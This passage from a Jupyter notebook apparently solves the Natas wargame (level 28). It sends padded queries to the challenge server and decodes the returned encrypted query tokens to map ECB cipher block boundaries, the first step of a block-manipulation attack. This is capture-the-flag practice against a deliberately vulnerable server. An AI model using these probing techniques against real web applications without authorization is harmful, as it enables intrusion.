      "?: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKtr51auK9EPQHhJapm3akvvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "?: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xad\\xaf\\x9dZ\\xb8\\xafD=\\x01\\xe1%\\xaaf\\xdd\\xa9/\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "@: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJwOtVA2a25VH3xlzy2va8mvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "@: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2p:\\xd5@\\xd9\\xad\\xb9T}\\xf1\\x97<\\xb6\\xbd\\xaf&\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "A: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKjd8MKDZZIiKG51FNeoPjUvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "A: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xa3w\\xc3\\n\\r\\x96H\\x88\\xa1\\xb9\\xd4S^\\xa0\\xf8\\xd4\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "B: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJjS9S3adXJc/WWvI3XdcvzvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "B: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2cK\\xd4\\xb7i\\xd5\\xc9s\\xf5\\x96\\xbc\\x8d\\xd7u\\xcb\\xf3\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "C: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIV6guc0zYmhS2FK2WeDX9XvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "C: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\x15\\xea\\x0b\\x9c\\xd36&\\x85-\\x85+e\\x9e\\r\\x7fW\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "D: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJPZL/HuhXFCvKgIB2/Zln5vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "D: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2Od\\xbf\\xc7\\xba\\x15\\xc5\\n\\xf2\\xa0 \\x1d\\xbffY\\xf9\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "E: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJibK/FTJvyvXqxFb51bhV1vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "E: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2bl\\xaf\\xc5L\\x9b\\xf2\\xbdz\\xb1\\x15\\xbeun\\x15u\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "F: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJhFsli4K/fPeKT4M8Ry23kvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "F: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2a\\x16\\xc9b\\xe0\\xaf\\xdf=\\xe2\\x93\\xe0\\xcf\\x11\\xcbm\\xe4\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "G: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKOKpwR3/gkTIMH8U7dhu4GvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "G: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\x8e*\\x9c\\x11\\xdf\\xf8$L\\x83\\x07\\xf1N\\xdd\\x86\\xee\\x06\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "H: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKIDMQGG2abZtjOsSZs1X39vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "H: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\x88\\x0c\\xc4\\x06\\x1bf\\x9bf\\xd8\\xce\\xb1&l\\xd5}\\xfd\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "I: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKOvt9wFI9mjTVoT/tGtl7FvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "I: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\x8e\\xbe\\xdfp\\x14\\x8ff\\x8d5hO\\xfbF\\xb6^\\xc5\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "J: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPL5KLXni7y8eqJFwXWh1DUnvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "J: b\"\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xf9(\\xb5\\xe7\\x8b\\xbc\\xbcz\\xa2E\\xc1u\\xa1\\xd45'\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p\"\n",
      "K: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPITdJXBsJQLwvXAvasuKjoevfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "K: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\x13t\\x95\\xc1\\xb0\\x94\\x0b\\xc2\\xf5\\xc0\\xbd\\xab.*:\\x1e\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "L: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPI2LEeQPtPKos7Cg24MI6rXvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "L: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf26,G\\x90>\\xd3\\xca\\xa2\\xce\\xc2\\x83n\\x0c#\\xaa\\xd7\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "M: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIFr55FtnKO9tEyQa/+96tovfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "M: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\x05\\xaf\\x9eE\\xb6r\\x8e\\xf6\\xd12A\\xaf\\xfe\\xf7\\xabh\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "N: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKQYCy/DcTbyaMyrOKXW+nmvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "N: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\x90`,\\xbf\\r\\xc4\\xdb\\xc9\\xa32\\xac\\xe2\\x97[\\xe9\\xe6\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "O: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJXWuUtLaAhQY1GD/2pLpWBvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "O: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2WZ\\xe5--\\xa0!A\\x8dF\\x0f\\xfd\\xa9.\\x95\\x81\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "P: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJslle8BYSivKdpv1B2Y01FvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "P: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2l\\x96W\\xbc\\x05\\x84\\xa2\\xbc\\xa7i\\xbfPvcME\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "Q: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJaGM8iPTFRQd0Zmcxed5mevfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "Q: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2Z\\x18\\xcf\"=1QA\\xdd\\x19\\x99\\xcc^w\\x99\\x9e\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "R: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJiDv3VFbwCsAwUlLNbD2BFvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "R: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2b\\x0e\\xfd\\xd5\\x15\\xbc\\x02\\xb0\\x0c\\x14\\x94\\xb3[\\x0f`E\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "S: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJ3Nmyh1ZS++nAIX1FELIkMvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "S: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2w6l\\xa1\\xd5\\x94\\xbe\\xfap\\x08_QD,\\x89\\x0c\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "T: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJO9/z7rq/TbEgCDg6ebTA6vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "T: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2N\\xf7\\xfc\\xfb\\xae\\xaf\\xd3lH\\x02\\x0e\\x0e\\x9em0:\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "U: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJs9IckNOkzgew37TadMpVqvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "U: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2l\\xf4\\x87$4\\xe93\\x81\\xec7\\xed6\\x9d2\\x95j\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "V: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJHdksLJFuUJ3MlCTPRoS7rvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "V: b\"\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2GvK\\x0b$[\\x94's%\\t3\\xd1\\xa1.\\xeb\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p\"\n",
      "W: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLxGu5bRS4vnVo0bm1VgVobvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "W: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xf1\\x1a\\xee[E./\\x9dZ4nmU\\x81Z\\x1b\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "X: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPI3GgIRwkWmfdd+oEfVBISnvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "X: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf27\\x1a\\x02\\x11\\xc2E\\xa6}\\xd7~\\xa0G\\xd5\\x04\\x84\\xa7\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "Y: G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPK6wkS+fLmU8WdWdeOrvNlhvfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=\n",
      "Y: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xba\\xc2D\\xbe|\\xb9\\x94\\xf1gVu\\xe3\\xab\\xbc\\xd9a\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n"
     ]
    }
   ],
   "source": [
    "for query, url in test.items():\n",
    "    print(f'{query}: {url}')\n",
    "    print(f'{query}: {base64.b64decode(url)}')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 78,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "{'': 'G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLof/YMma1yzL2UfjQXqQEop36O0aq+C10FxP/mrBQjq0eOsaH+JhosbBUGEQmz/to=', 'a': 'G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKriAqPE2++uYlniRMkobB1vfoQVOxoUVz5bypVRFkZR5BPSyq/LC12hqpypTFRyXA=', 'aa': 'G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKxMKUxvsiccFITv6XJZnrHSHmaB7HSm1mCAVyTVcLgDq3tm9uspqc7cbNaAQ0sTFc=', 'aaa': 'G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPIvUpOmOsuf6Me06CS3bWodmi4rXbbzHxmhT3Vnjq2qkEJJuT5N6gkJR5mVucRLNRo=', 'aaaa': 'G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPI1BKmpZ1/9YUtPH5DShPyqKSh/PMVHnhLmbzHIY7GAR1bVcy3Ix3D2Q5cVi8F6bmY=', 'aaaaa': 'G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPLDah8EaRWKMFIWYUal4/LsrDuHHBxEg4a0XNNtno9y9GVRSbu6ISPYnZVBfqJ/Ons=', 'aaaaaa': 'G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJKEf/nOv0V2qBes8NIbc3hQcCYxLrNxe2TV1ZOUQXdfmTQ3MhoJTaSrfy9N5bRv4o=', 'aaaaaaa': 'G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKf3hzvbj+EoXJjPzB0/I4YZIaVSupG+5Ppq4WEW09L0Nf/K3JUU/wpRwHlH118D44=', 'aaaaaaaa': 'G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPJFPgAgYC9NzNUPDrdwlHfCiW3pCIT4YQixZ/i0rqXXY5FyMgUUg+aORY/QZhZ7MKM=', 'aaaaaaaaa': 'G+glEae6W/1XjA7vRm21nNyEco/c+J2TdR0Qp8dcjPKeYiaGpSZAWVcGCZq8sFK7oJUi8wHPnTascCPxZZSMWpc5zZBSL6eob5V3O1b5+MA='}\n"
     ]
    }
   ],
   "source": [
    "#natas28\n",
    "count = 28\n",
    "init()\n",
    "\n",
    "test2 = {}\n",
    "\n",
    "for i in range(0, 10):\n",
    "    query = 'a' * i\n",
    "    param = {\"query\": query}\n",
    "    res = requests.get(url, auth=auth, params=param)\n",
    "    test2[query] = urllib.parse.unquote(res.url.split('query=')[1])\n",
    "print(test2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 79,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      ": b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xe8\\x7f\\xf6\\x0c\\x99\\xadr\\xcc\\xbd\\x94~4\\x17\\xa9\\x01(\\xa7~\\x8e\\xd1\\xaa\\xbe\\x0b]\\x05\\xc4\\xff\\xe6\\xac\\x14#\\xabG\\x8e\\xb1\\xa1\\xfe&\\x1a,l\\x15\\x06\\x11\\t\\xb3\\xfe\\xda'\n",
      "a: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xab\\x88\\n\\x8f\\x13o\\xbe\\xb9\\x89g\\x89\\x13$\\xa1\\xb0u\\xbd\\xfa\\x10T\\xechQ\\\\\\xf9o*UDY\\x19G\\x90OK*\\xbf,-v\\x86\\xaar\\xa51Q\\xc9p'\n",
      "aa: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xb10\\xa51\\xbe\\xc8\\x9cpR\\x13\\xbf\\xa5\\xc9fz\\xc7Hy\\x9a\\x07\\xb1\\xd2\\x9bY\\x82\\x01\\\\\\x93U\\xc2\\xe0\\x0e\\xad\\xed\\x9b\\xdb\\xac\\xa6\\xa7;q\\xb3Z\\x01\\r,LW'\n",
      "aaa: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2/R\\x93\\xa6:\\xcb\\x9f\\xe8\\xc7\\xb4\\xe8$\\xb7mj\\x1d\\x9a.+]\\xb6\\xf3\\x1f\\x19\\xa1Oug\\x8e\\xad\\xaa\\x90BI\\xb9>M\\xea\\t\\tG\\x99\\x95\\xb9\\xc4K5\\x1a'\n",
      "aaaa: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf25\\x04\\xa9\\xa9g_\\xfdaKO\\x1f\\x90\\xd2\\x84\\xfc\\xaa)(\\x7f<\\xc5G\\x9e\\x12\\xe6o1\\xc8c\\xb1\\x80GV\\xd5s-\\xc8\\xc7p\\xf6C\\x97\\x15\\x8b\\xc1znf'\n",
      "aaaaa: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\xc3j\\x1f\\x04i\\x15\\x8a0R\\x16aF\\xa5\\xe3\\xf2\\xec\\xac;\\x87\\x1c\\x1cD\\x83\\x86\\xb4\\\\\\xd3m\\x9e\\x8fr\\xf4eQI\\xbb\\xba!#\\xd8\\x9d\\x95A~\\xa2\\x7f:{'\n",
      "aaaaaa: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2J\\x11\\xff\\xe7:\\xfd\\x15\\xda\\xa0^\\xb3\\xc3Hm\\xcd\\xe1A\\xc0\\x98\\xc4\\xba\\xcd\\xc5\\xed\\x93WVNQ\\x05\\xdd~d\\xd0\\xdc\\xc8h%6\\x92\\xad\\xfc\\xbd7\\x96\\xd1\\xbf\\x8a'\n",
      "aaaaaaa: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\x9f\\xde\\x1c\\xefn?\\x84\\xa1rc?0t\\xfc\\x8e\\x18d\\x86\\x95J\\xeaF\\xfb\\x93\\xe9\\xab\\x85\\x84[OK\\xd0\\xd7\\xff+rTS\\xfc)G\\x01\\xe5\\x1f]|\\x0f\\x8e'\n",
      "aaaaaaaa: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2E>\\x00 `/M\\xcc\\xd5\\x0f\\x0e\\xb7p\\x94w\\xc2\\x89m\\xe9\\x08\\x84\\xf8a\\x08\\xb1g\\xf8\\xb4\\xae\\xa5\\xd7c\\x91r2\\x05\\x14\\x83\\xe6\\x8eE\\x8f\\xd0f\\x16{0\\xa3'\n",
      "aaaaaaaaa: b'\\x1b\\xe8%\\x11\\xa7\\xba[\\xfdW\\x8c\\x0e\\xefFm\\xb5\\x9c\\xdc\\x84r\\x8f\\xdc\\xf8\\x9d\\x93u\\x1d\\x10\\xa7\\xc7\\\\\\x8c\\xf2\\x9eb&\\x86\\xa5&@YW\\x06\\t\\x9a\\xbc\\xb0R\\xbb\\xa0\\x95\"\\xf3\\x01\\xcf\\x9d6\\xacp#\\xf1e\\x94\\x8cZ\\x979\\xcd\\x90R/\\xa7\\xa8o\\x95w;V\\xf9\\xf8\\xc0'\n"
     ]
    }
   ],
   "source": [
    "for query, url in test2.items():\n",
    "    print(f'{query}: {url}')\n",
    "    # print(f'{query}: {base64.b64decode(url)}')"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.9"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
